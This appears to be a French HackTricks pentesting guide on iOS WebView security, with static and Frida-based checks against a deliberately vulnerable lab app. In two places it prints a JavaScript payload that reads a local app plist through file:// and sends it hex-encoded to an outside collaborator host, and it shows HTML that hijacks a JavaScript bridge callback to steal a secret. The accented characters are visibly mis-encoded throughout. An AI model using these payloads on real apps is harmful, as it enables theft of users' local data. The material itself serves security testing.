Les WebViews sont des composants de navigateur int√©gr√©s aux applications pour afficher du contenu web interactif. Ils peuvent √™tre utilis√©s pour int√©grer directement du contenu web dans l'interface utilisateur d'une application. Les WebViews iOS prennent en charge l'ex√©cution de JavaScript par d√©faut, de sorte que l'injection de script et les attaques de script intersites peuvent les affecter.

* **UIWebView** : UIWebView est obsol√®te √† partir d'iOS 12 et ne doit pas √™tre utilis√©. Il ne devrait pas √™tre utilis√©. JavaScript ne peut pas √™tre d√©sactiv√©.
* **WKWebView** : c'est le choix appropri√© pour √©tendre la fonctionnalit√© de l'application, contr√¥ler le contenu affich√©.
  * JavaScript est activ√© par d√©faut, mais gr√¢ce √† la propri√©t√© `javaScriptEnabled` de `WKWebView`, il peut √™tre compl√®tement d√©sactiv√©, emp√™chant toutes les failles d'injection de script.
  * La propri√©t√© `JavaScriptCanOpenWindowsAutomatically` peut √™tre utilis√©e pour emp√™cher JavaScript d'ouvrir de nouvelles fen√™tres, telles que des pop-ups.
  * La propri√©t√© `hasOnlySecureContent` peut √™tre utilis√©e pour v√©rifier que les ressources charg√©es par le WebView sont r√©cup√©r√©es via des connexions chiffr√©es.
  * `WKWebView` impl√©mente un rendu hors processus, de sorte que les bugs de corruption de m√©moire n'affecteront pas le processus principal de l'application.
* **SFSafariViewController** : il doit √™tre utilis√© pour fournir une exp√©rience de visualisation web g√©n√©ralis√©e. Ces WebViews peuvent √™tre facilement rep√©r√©s car ils ont une disposition caract√©ristique qui comprend les √©l√©ments suivants :

    * Un champ d'adresse en lecture seule avec un indicateur de s√©curit√©.
    * Un bouton d'action ("Partager").
    * Un bouton "Termin√©", des boutons de navigation avant et arri√®re, et un bouton "Safari" pour ouvrir la page directement dans Safari.

    <img src="https://gblobscdn.gitbook.com/assets%2F-LH00RC4WVf3-6Ou4e0l%2F-Lf1APQHyCHdAvoJSvc_%2F-Lf1AQxr7FPsOyPFSGcs%2Fsfsafariviewcontroller.png?alt=media" alt="" data-size="original">

    * JavaScript ne peut pas √™tre d√©sactiv√© dans `SFSafariViewController` et c'est l'une des raisons pour lesquelles l'utilisation de `WKWebView` est recommand√©e lorsque l'objectif est d'√©tendre l'interface utilisateur de l'application.
    * `SFSafariViewController` partage √©galement les cookies et autres donn√©es de site Web avec Safari.
    * L'activit√© et l'interaction de l'utilisateur avec un `SFSafariViewController` ne sont pas visibles pour l'application, qui ne peut pas acc√©der aux donn√©es de saisie automatique, √† l'historique de navigation ou aux donn√©es de site Web.
    * Selon les directives de r√©vision de l'App Store, les `SFSafariViewController` ne peuvent pas √™tre masqu√©s ou obscurcis par d'autres vues ou couches.

## D√©couverte de la configuration des WebViews

### Analyse statique

**UIWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
489 0x0002fee9 0x10002fee9   9  10 (5.__TEXT.__cstring) ascii UIWebView
896 0x0003c813 0x0003c813  24  25 () ascii @_OBJC_CLASS_$_UIWebView
1754 0x00059599 0x00059599  23  24 () ascii _OBJC_CLASS_$_UIWebView
```
**WKWebView**

WKWebView est une vue Web introduite dans iOS 8 qui remplace UIWebView. Elle est plus rapide et plus efficace que UIWebView car elle utilise le moteur de rendu WebKit. Elle prend √©galement en charge les fonctionnalit√©s HTML5 et JavaScript modernes.

Pour tester une application iOS qui utilise WKWebView, vous pouvez utiliser des outils tels que Burp Suite ou OWASP ZAP pour intercepter et modifier le trafic HTTP/S. Vous pouvez √©galement utiliser des outils tels que Frida ou Cycript pour injecter du code JavaScript dans l'application et manipuler la vue Web.

Il est important de noter que les applications iOS utilisant WKWebView peuvent √™tre vuln√©rables √† des attaques de type XSS (Cross-Site Scripting) si elles ne sont pas correctement s√©curis√©es. Les d√©veloppeurs doivent s'assurer que toutes les entr√©es utilisateur sont correctement valid√©es et √©chapp√©es avant d'√™tre affich√©es dans la vue Web.
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
490 0x0002fef3 0x10002fef3   9  10 (5.__TEXT.__cstring) ascii WKWebView
625 0x00031670 0x100031670  17  18 (5.__TEXT.__cstring) ascii unwindToWKWebView
904 0x0003c960 0x0003c960  24  25 () ascii @_OBJC_CLASS_$_WKWebView
1757 0x000595e4 0x000595e4  23  24 () ascii _OBJC_CLASS_$_WKWebView
```
Alternativement, vous pouvez √©galement rechercher les m√©thodes connues de ces classes WebView. Par exemple, recherchez la m√©thode utilis√©e pour initialiser un WKWebView ([`init(frame:configuration:)`](https://developer.apple.com/documentation/webkit/wkwebview/1414998-init)):
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
0x5c3ac 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC
0x5d97a 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO
0x6b5d5 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC
0x6c3fa 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO
```
#### Test de la configuration JavaScript

Pour les `WKWebView`, il est recommand√© de d√©sactiver JavaScript sauf s'il est explicitement requis. Pour v√©rifier que JavaScript a √©t√© correctement d√©sactiv√©, recherchez les utilisations de `WKPreferences` dans le projet et assurez-vous que la propri√©t√© [`javaScriptEnabled`](https://developer.apple.com/documentation/webkit/wkpreferences/1536203-javascriptenabled) est d√©finie sur `false`:
```
let webPreferences = WKPreferences()
webPreferences.javaScriptEnabled = false
```
Si vous avez seulement le binaire compil√©, vous pouvez chercher cela dedans :
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
391 0x0002f2c7 0x10002f2c7  17  18 (4.__TEXT.__objc_methname) ascii javaScriptEnabled
392 0x0002f2d9 0x10002f2d9  21  22 (4.__TEXT.__objc_methname) ascii setJavaScriptEnabled
```
#### Test de OnlySecureContent

Contrairement aux `UIWebView`, lors de l'utilisation de `WKWebView`, il est possible de d√©tecter [du contenu mixte](https://developers.google.com/web/fundamentals/security/prevent-mixed-content/fixing-mixed-content?hl=en) (contenu HTTP charg√© √† partir d'une page HTTPS). En utilisant la m√©thode [`hasOnlySecureContent`](https://developer.apple.com/documentation/webkit/wkwebview/1415002-hasonlysecurecontent), il est possible de v√©rifier si toutes les ressources de la page ont √©t√© charg√©es via des connexions s√©curis√©es et crypt√©es.\
Dans le binaire compil√© :
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
Vous pouvez √©galement rechercher dans le code source ou les cha√Ænes la cha√Æne "http://". Cependant, cela ne signifie pas n√©cessairement qu'il y a un probl√®me de contenu mixte. En savoir plus sur le contenu mixte dans les [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/Security/Mixed\_content).

### Analyse dynamique

Il est possible d'inspecter le tas via `ObjC.choose()` pour trouver des instances des diff√©rents types de WebViews et √©galement rechercher les propri√©t√©s `javaScriptEnabled` et `hasonlysecurecontent` :

{% code title="webviews_inspector.js" %}
```javascript
ObjC.choose(ObjC.classes['UIWebView'], {
  onMatch: function (ui) {
    console.log('onMatch: ', ui);
    console.log('URL: ', ui.request().toString());
  },
  onComplete: function () {
    console.log('done for UIWebView!');
  }
});

ObjC.choose(ObjC.classes['WKWebView'], {
  onMatch: function (wk) {
    console.log('onMatch: ', wk);
    console.log('URL: ', wk.URL().toString());
  },
  onComplete: function () {
    console.log('done for WKWebView!');
  }
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
  onMatch: function (sf) {
    console.log('onMatch: ', sf);
  },
  onComplete: function () {
    console.log('done for SFSafariViewController!');
  }
});

ObjC.choose(ObjC.classes['WKWebView'], {
  onMatch: function (wk) {
    console.log('onMatch: ', wk);
    console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
  }
});

ObjC.choose(ObjC.classes['WKWebView'], {
  onMatch: function (wk) {
    console.log('onMatch: ', wk);
    console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
  }
});
```
{% endcode %}

Chargez-le avec:
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js

onMatch:  <WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = <CALayer: 0x1c4238f20>>

hasOnlySecureContent:  false
```
## Gestion des protocoles WebView

Plusieurs sch√©mas par d√©faut sont disponibles et sont interpr√©t√©s dans une WebView sur iOS, par exemple :

* http(s)://
* file://
* tel://

Les WebViews peuvent charger du contenu distant √† partir d'un point de terminaison, mais elles peuvent √©galement charger du contenu local √† partir du r√©pertoire de donn√©es de l'application. Si le contenu local est charg√©, l'utilisateur ne devrait pas √™tre en mesure d'influencer le nom de fichier ou le chemin utilis√© pour charger le fichier, et les utilisateurs ne devraient pas √™tre en mesure de modifier le fichier charg√©.

### Chargement de contenu WebView

* **UIWebView** : Il peut utiliser des m√©thodes obsol√®tes [`loadHTMLString:baseURL:`](https://developer.apple.com/documentation/uikit/uiwebview/1617979-loadhtmlstring?language=objc) ou [`loadData:MIMEType:textEncodingName:baseURL:`](https://developer.apple.com/documentation/uikit/uiwebview/1617941-loaddata?language=objc) pour charger du contenu.
* **WKWebView** : Il peut utiliser les m√©thodes [`loadHTMLString:baseURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1415004-loadhtmlstring?language=objc) ou [`loadData:MIMEType:textEncodingName:baseURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1415011-loaddata?language=objc) pour charger des fichiers HTML locaux et `loadRequest:` pour le contenu web. Typiquement, les fichiers locaux sont charg√©s en combinaison avec des m√©thodes incluant, entre autres : [`pathForResource:ofType:`](https://developer.apple.com/documentation/foundation/nsbundle/1410989-pathforresource), [`URLForResource:withExtension:`](https://developer.apple.com/documentation/foundation/nsbundle/1411540-urlforresource?language=objc) ou [`init(contentsOf:encoding:)`](https://developer.apple.com/documentation/swift/string/3126736-init). De plus, vous devriez √©galement v√©rifier si l'application utilise la m√©thode [`loadFileURL:allowingReadAccessToURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1414973-loadfileurl?language=objc). Son premier param√®tre est `URL` et contient l'URL √† charger dans la WebView, son deuxi√®me param√®tre `allowingReadAccessToURL` peut contenir un seul fichier ou un r√©pertoire. S'il contient un seul fichier, ce fichier sera disponible pour la WebView. Cependant, s'il contient un r√©pertoire, tous les fichiers de ce **r√©pertoire seront disponibles pour la WebView**. Par cons√©quent, il vaut la peine d'inspecter cela et, dans le cas o√π il s'agit d'un r√©pertoire, de v√©rifier qu'aucune donn√©e sensible ne peut √™tre trouv√©e √† l'int√©rieur.

Si vous avez le code source, vous pouvez rechercher ces m√©thodes. Si vous avez le **binaire compil√©**, vous pouvez √©galement rechercher ces m√©thodes :
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
### Acc√®s aux fichiers

* **UIWebView:**
  * Le sch√©ma `file://` est toujours activ√©.
  * L'acc√®s aux fichiers √† partir des URL `file://` est toujours activ√©.
  * L'acc√®s universel √† partir des URL `file://` est toujours activ√©.
  * Si vous r√©cup√©rez l'origine effective d'un `UIWebView` o√π `baseURL` est √©galement d√©fini sur `nil`, vous verrez qu'elle n'est **pas d√©finie sur "null"**, mais vous obtiendrez quelque chose de similaire √† ce qui suit : `applewebdata://5361016c-f4a0-4305-816b-65411fc1d78`. Cette origine "applewebdata://" est similaire √† l'origine "file://" car elle **n'impl√©mente pas la politique de m√™me origine** et permet l'acc√®s aux fichiers locaux et √† toutes les ressources web. 

{% tabs %}
{% tab title="exfiltrate_file" %}
```javascript
String.prototype.hexEncode = function(){
    var hex, i;
    var result = "";
    for (i=0; i<this.length; i++) {
        hex = this.charCodeAt(i).toString(16);
        result += ("000"+hex).slice(-4);
    }
    return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        var xhr2 = new XMLHttpRequest();
        xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
        xhr2.send(null);
    }
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
{% endtab %}
{% endtabs %}

* **WKWebView**:
  * **`allowFileAccessFromFileURLs`** (`WKPreferences`, `false` by default): cela permet √† JavaScript s'ex√©cutant dans le contexte d'une URL de sch√©ma `file://` d'acc√©der au contenu d'autres URL de sch√©ma `file://`.
  * **`allowUniversalAccessFromFileURLs`** (`WKWebViewConfiguration`, `false` by default): cela permet √† JavaScript s'ex√©cutant dans le contexte d'une URL de sch√©ma `file://` d'acc√©der au contenu de n'importe quelle origine.

Vous pouvez rechercher ces fonctions dans le code source de l'application ou dans le binaire compil√©.\
De plus, vous pouvez utiliser le script frida suivant pour trouver ces informations:
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
  onMatch: function (wk) {
    console.log('onMatch: ', wk);
    console.log('URL: ', wk.URL().toString());
    console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
    console.log('allowFileAccessFromFileURLs: ',
            wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
    console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
    console.log('allowUniversalAccessFromFileURLs: ',
            wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
  },
  onComplete: function () {
    console.log('done for WKWebView!');
  }
});
```

```bash
frida -U -f com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js

onMatch:  <WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = <CALayer: 0x1c4238f20>>
URL:  file:///var/mobile/Containers/Data/Application/A654D169-1DB7-429C-9DB9-A871389A8BAA/
        Library/WKWebView/scenario1.html
javaScriptEnabled:  true
allowFileAccessFromFileURLs:  0
hasOnlySecureContent:  false
allowUniversalAccessFromFileURLs:  0
```
#### Exfiltrer des fichiers arbitraires
```javascript
//For some reason this payload doesn't work!!
//Let me know if you know how to exfiltrate local files from a WKWebView
String.prototype.hexEncode = function(){
    var hex, i;
    var result = "";
    for (i=0; i<this.length; i++) {
        hex = this.charCodeAt(i).toString(16);
        result += ("000"+hex).slice(-4);
    }
    return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        var xhr2 = new XMLHttpRequest();
        xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
        xhr2.send(null);
    }
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## M√©thodes natives expos√©es via les WebViews

Depuis iOS 7, Apple a introduit des API qui permettent **la communication entre le runtime JavaScript dans la WebView et les objets natifs** Swift ou Objective-C.

Il existe deux fa√ßons fondamentales dont le code natif et JavaScript peuvent communiquer :

* **JSContext** : lorsqu'un bloc Objective-C ou Swift est assign√© √† un identificateur dans un `JSContext`, JavaScriptCore enveloppe automatiquement le bloc dans une fonction JavaScript.
* **Protocole JSExport** : les propri√©t√©s, les m√©thodes d'instance et les m√©thodes de classe d√©clar√©es dans un protocole h√©rit√© de `JSExport` sont mapp√©es sur des objets JavaScript qui sont disponibles pour tout le code JavaScript. Les modifications des objets qui sont dans l'environnement JavaScript sont refl√©t√©es dans l'environnement natif.

Notez que **seuls les membres de classe d√©finis dans le protocole `JSExport`** sont accessibles au code JavaScript.\
Recherchez le code qui mappe les objets natifs sur le `JSContext` associ√© √† une WebView et analysez la fonctionnalit√© qu'il expose, par exemple, aucune donn√©e sensible ne doit √™tre accessible et expos√©e aux WebViews.\
En Objective-C, le `JSContext` associ√© √† une `UIWebView` est obtenu comme suit :
```objectivec
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
Le code JavaScript dans un **`WKWebView` peut toujours envoyer des messages √† l'application native, mais contrairement √† `UIWebView`, il n'est pas possible de r√©f√©rencer directement le `JSContext` d'un `WKWebView`. Au lieu de cela, la communication est impl√©ment√©e √† l'aide d'un syst√®me de messagerie et de la fonction `postMessage`, qui s√©rialise automatiquement les objets JavaScript en objets Objective-C ou Swift natifs. Les gestionnaires de messages sont configur√©s √† l'aide de la m√©thode [`add(_ scriptMessageHandler:name:)`](https://developer.apple.com/documentation/webkit/wkusercontentcontroller/1537172-add).

### Activation de JavascriptBridge
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
    options_dict["javaScriptBridge"]?.value = enabled
    let userContentController = wkWebViewConfiguration.userContentController
    userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

    if enabled {
            let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
            userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
    }
}
```
### Envoi de message

L'ajout d'un gestionnaire de message de script avec le nom `"name"` (ou `"javaScriptBridge"` dans l'exemple ci-dessus) provoque la d√©finition de la fonction JavaScript `window.webkit.messageHandlers.myJavaScriptMessageHandler.postMessage` dans tous les cadres de toutes les vues Web qui utilisent le contr√¥leur de contenu utilisateur. Il peut ensuite √™tre [utilis√© √† partir du fichier HTML comme ceci](https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/d4e2d9efbde8841bf7e4a8800418dda6bb116ec6/WheresMyBrowser/web/WKWebView/scenario3.html#L33):
```javascript
function invokeNativeOperation() {
    value1 = document.getElementById("value1").value
    value2 = document.getElementById("value2").value
    window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}
//After testing the previos funtion I got the error TypeError: undefined is not an object (evaluating 'window.webkit.messageHandlers')
//But the following code worked to call the exposed javascriptbridge with the args "addNumbers", "1", "2"

document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
Une fois que la fonction Native est ex√©cut√©e, elle ex√©cutera g√©n√©ralement **du JavaScript √† l'int√©rieur de la page Web** (voir `evaluateJavascript` ci-dessous) et vous pouvez √™tre int√©ress√© √† **remplacer la fonction** qui va √™tre ex√©cut√©e pour **voler le r√©sultat**.\
Par exemple, dans le script ci-dessous, la fonction **`javascriptBridgeCallBack`** va √™tre ex√©cut√©e avec 2 param√®tres (la fonction appel√©e et le **r√©sultat**). Si vous contr√¥lez le HTML qui va √™tre charg√©, vous pouvez cr√©er une **alerte avec le r√©sultat** comme suit:
```markup
<html>
    <script>
        document.location = "javascriptbridge://getSecret"
        function javascriptBridgeCallBack(name, result) {
            alert(result);
        }
    </script>
</html>
```
### Fonction appel√©e

La fonction appel√©e se trouve dans [`JavaScriptBridgeMessageHandler.swift`](https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/b8d4abda4000aa509c7a5de79e5c90360d1d0849/WheresMyBrowser/JavaScriptBridgeMessageHandler.swift#L29) :
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {

//...

case "multiplyNumbers":

        let arg1 = Double(messageArray[1])!
        let arg2 = Double(messageArray[2])!
        result = String(arg1 * arg2)
//...

let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
```
### Test

Pour tester l'envoi d'un postMessage √† l'int√©rieur d'une application, vous pouvez :

* Changer la r√©ponse des serveurs (MitM)
* Effectuer une instrumentation dynamique et injecter la charge utile JavaScript en utilisant des frameworks tels que Frida et les fonctions d'√©valuation JavaScript correspondantes disponibles pour les iOS WebViews ([`stringByEvaluatingJavaScriptFromString:`](https://developer.apple.com/documentation/uikit/uiwebview/1617963-stringbyevaluatingjavascriptfrom?language=objc) pour `UIWebView` et [`evaluateJavaScript:completionHandler:`](https://developer.apple.com/documentation/webkit/wkwebview/1415017-evaluatejavascript?language=objc) pour `WKWebView`).

## D√©bogage des iOS WebViews

(Tutoriel de [https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews))

Dans les webviews iOS, les messages pass√©s √† `console.log()` ne sont _pas_ imprim√©s dans les journaux Xcode. Il est encore relativement facile de d√©boguer le contenu Web avec les outils de d√©veloppement de Safari, bien qu'il y ait quelques limitations :

* Le d√©bogage des webviews iOS n√©cessite Safari, donc votre ordinateur de d√©veloppement doit ex√©cuter macOS.
* Vous ne pouvez d√©boguer que les webviews dans les applications charg√©es sur votre appareil via Xcode. Vous ne pouvez pas d√©boguer les webviews dans les applications install√©es via l'App Store ou Apple Configurator.

Avec ces limitations √† l'esprit, voici les √©tapes pour d√©boguer √† distance un webview dans iOS :

* Tout d'abord, activez l'inspecteur Web Safari sur votre appareil iOS en ouvrant l'application iOS _Param√®tres_, en naviguant vers **Param√®tres > Safari > Avanc√©**, et en activant l'option _Inspecteur Web_.

![iOS Safari settings](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/ios-safari-settings.jpg)

* Ensuite, vous devez √©galement activer les outils de d√©veloppement dans Safari sur votre ordinateur de d√©veloppement. Lancez Safari sur votre machine de d√©veloppement et acc√©dez √† **Safari > Pr√©f√©rences** dans la barre de menus. Dans le volet des pr√©f√©rences qui appara√Æt, cliquez sur l'onglet _Avanc√©_ et activez l'option _Afficher le menu D√©veloppement_ en bas. Apr√®s avoir fait cela, vous pouvez fermer le volet des pr√©f√©rences.

![Mac Safari settings](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-settings.jpg)

* Connectez votre appareil iOS √† votre ordinateur de d√©veloppement et lancez votre application.
* Dans Safari sur votre ordinateur de d√©veloppement, cliquez sur _D√©velopper_ dans la barre de menus et survolez l'option de menu d√©roulant qui est le nom de votre appareil iOS pour afficher une liste des instances de webview en cours d'ex√©cution sur votre appareil iOS.

![Mac Safari develop menu](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-develop-menu.jpg)

* Cliquez sur l'option de menu d√©roulant pour le webview que vous souhaitez d√©boguer. Cela ouvrira une nouvelle fen√™tre Safari Web Inspector pour inspecter le webview.

![Safari Web Inspector window](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-inspector.jpg)

## R√©f√©rences

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
